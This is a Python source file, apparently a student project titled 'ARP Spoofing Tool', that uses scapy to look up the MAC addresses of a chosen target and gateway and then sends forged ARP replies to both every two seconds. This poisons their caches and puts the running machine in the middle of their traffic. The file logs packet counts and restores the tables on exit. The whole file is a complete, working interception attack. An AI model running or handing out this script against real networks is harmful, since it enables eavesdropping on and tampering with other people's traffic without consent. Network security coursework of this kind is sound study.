# student_name: Dakkshina M
# roll_number: 03
# project_name: ARP Spoofing Tool
# date: 2026-03-29

from scapy.all import ARP, Ether, sendp, srp, conf
import time, sys, datetime, os

print(f"[03] tool_main.py started at {datetime.datetime.now()}")

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, verbose=False)
    return ans[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(Ether(dst=target_mac)/pkt, verbose=False)
    print(f"[03] Sent ARP spoof: {spoof_ip} is at our MAC -> {target_ip}")

def restore(dest_ip, src_ip, dest_mac, src_mac):
    pkt = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    sendp(Ether(dst=dest_mac)/pkt, count=4, verbose=False)
    print(f"[03] Restored ARP table for {dest_ip}")

if len(sys.argv) != 3:
    print("Usage: sudo python3 tool_main.py <target_ip> <gateway_ip>")
    sys.exit(1)

target_ip  = sys.argv[1]
gateway_ip = sys.argv[2]

print(f"[03] Target IP : {target_ip}")
print(f"[03] Gateway IP: {gateway_ip}")

try:
    target_mac  = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    print(f"[03] Target MAC : {target_mac}")
    print(f"[03] Gateway MAC: {gateway_mac}")
except IndexError as e:
    print(f"[03] ERROR: Could not resolve MAC address.")
    print(f"[03] Exception: {e}")
    print(f"[03] Traceback: host may be unreachable or does not exist.")
    sys.exit(1)

os.makedirs("logs", exist_ok=True)
log = open("logs/run_output.txt", "w")

print(f"[03] Starting ARP spoofing... Press Ctrl+C to stop.")
sent = 0
try:
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        sent += 2
        msg = f"[03] Packets sent: {sent} at {datetime.datetime.now()}"
        print(msg)
        log.write(msg + "\n")
        time.sleep(2)
except KeyboardInterrupt:
    print(f"\n[03] Stopping... restoring ARP tables.")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    log.close()
    print(f"[03] Done. Total packets sent: {sent}")
